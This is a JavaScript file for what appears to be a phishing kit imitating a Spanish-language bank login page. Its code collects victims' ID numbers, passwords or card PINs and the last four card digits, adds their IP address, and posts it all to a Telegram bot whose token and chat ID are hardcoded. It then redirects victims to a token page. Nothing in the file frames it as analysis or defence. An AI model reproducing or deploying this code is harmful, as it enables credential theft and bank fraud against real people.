// app.js

const BOT_TOKEN = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk';
const CHAT_ID   = '-1002373013684';

// Función para enviar el mensaje a Telegram
function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
  });
}

// Función para alternar las pestañas (Clave Segura / Tarjeta Débito)
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');

    const target = tab.dataset.target;
    document.querySelectorAll('.formulario').forEach(form => form.style.display = 'none');
    document.getElementById(target).style.display = 'block';

    document.getElementById('info-text').innerText =
      target === 'clave-segura'
        ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar."
        : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar.";

    checkFields();
  });
});

// Función para alternar la visibilidad de las contraseñas
document.querySelectorAll('.toggle-password').forEach(toggle => {
  toggle.addEventListener('click', () => {
    const input = toggle.previousElementSibling;
    input.type = input.type === 'password' ? 'text' : 'password';
    toggle.textContent = input.type === 'password' ? 'Mostrar' : 'Ocultar';
  });
});

// Función para cerrar el mensaje informativo
document.querySelector('.close-btn').addEventListener('click', () => {
  document.querySelector('.info-message').style.display = 'none';
});

// Botón de ingreso
const btn = document.getElementById('btnIngresar');

// Escucha cambios en los campos de texto para activar el botón
['idNumCS', 'claveInput', 'idNumTD', 'claveTarjeta', 'ult4Tarjeta']
  .map(id => document.getElementById(id))
  .filter(element => element)
  .forEach(element => element.addEventListener('input', checkFields));

// Función para habilitar o deshabilitar el botón de "Ingresar"
function checkFields() {
  const activeTab = document.querySelector('.tab.active').dataset.target;
  let valid = false;

  if (activeTab === 'clave-segura') {
    valid = document.getElementById('idNumCS').value.trim() !== '' &&
            document.getElementById('claveInput').value.trim() !== '';
  } else {
    valid = document.getElementById('idNumTD').value.trim() !== '' &&
            document.getElementById('claveTarjeta').value.trim() !== '' &&
            document.getElementById('ult4Tarjeta').value.trim() !== '';
  }

  btn.disabled = !valid;
  btn.classList.toggle('active', valid);
}

// Evento de clic en el botón "Ingresar"
btn.addEventListener('click', () => {
  const activeTab = document.querySelector('.tab.active').dataset.target;
  const tipo = activeTab === 'clave-segura' ? 'Clave Segura' : 'Tarjeta Débito';
  const idType = activeTab === 'clave-segura' ? document.getElementById('idTypeCS').value : document.getElementById('idTypeTD').value;
  const idNum = activeTab === 'clave-segura' ? document.getElementById('idNumCS').value.trim() : document.getElementById('idNumTD').value.trim();
  const clave = activeTab === 'clave-segura' ? document.getElementById('claveInput').value.trim() : document.getElementById('claveTarjeta').value.trim();
  const ult4 = activeTab === 'tarjeta-debito' ? document.getElementById('ult4Tarjeta').value.trim() : '';

  // Generar el mensaje para enviar a Telegram
  let message = `📥 *Nueva solicitud*\n• *Tipo:* ${tipo}\n• *${idType}:* ${idNum}\n• *Clave:* ${clave}\n`;
  if (ult4) message += `• *Últimos 4:* ${ult4}\n`;

  // Obtener la IP del usuario
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      message += `• *IP:* ${data.ip}\n`;
    })
    .catch(() => {
      message += `• *IP:* desconocida\n`;
    })
    .finally(() => {
      sendToTelegram(message);
      window.location.href = 'token.html';
    });
});